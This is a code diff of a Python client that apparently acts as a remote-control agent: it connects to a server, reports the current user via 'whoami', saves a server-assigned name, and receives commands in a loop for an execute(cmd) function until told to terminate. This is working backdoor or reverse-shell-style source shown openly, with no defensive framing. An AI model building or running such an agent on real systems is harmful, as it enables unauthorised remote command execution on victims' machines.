@@ -31,28 +31,35 @@ def execute(cmd):
         print(output)
         return output
 
-#Creating a socket
-server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-server.setblocking(True)
-#Connect the client
-server.connect((target_host,target_port))
-
-def Handshake():
-    #Send some data
-    server.send(b"Handshake Initialised from " + bytes(name,'utf-8'))
-
+def Handshake(socket):
+    if os.path.exists("myInfo"):
+        with open("myInfo","r") as f:
+            name = f.readline()
+        socket.send(b"Handshake Initialised from " + bytes(name,'utf-8'))
+        response = socket.recv(4096)
+        print(response.decode())
+        return response.decode()
+    else:
+        socket.send(b"New Connection from '" + bytes(subprocess.getoutput('whoami'),'utf-8') + b"'. Please name the system!")
+        response = socket.recv(4096)
+        if response.decode():
+            print("Sever assigned name: " + response.decode())
+            with open("myInfo","a+") as f:
+                f.write(response.decode())
+        return 'ACK'
     #Receive data
-    response = server.recv(4096)
-    print(response.decode())
-    return response.decode()
+    
 
 def main():
-    with open("myInfo","r") as f:
-        name = f.readline()
     target_host = 'localhost'
     target_port = 9999
+    #Creating a socket
+    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    server.setblocking(True)
+    #Connect the client
+    server.connect((target_host,target_port))
     response = ''
-    ack = Handshake()
+    ack = Handshake(server)
     if ack == 'ACK':
         while response != 'terminate':
             response = server.recv(4096)
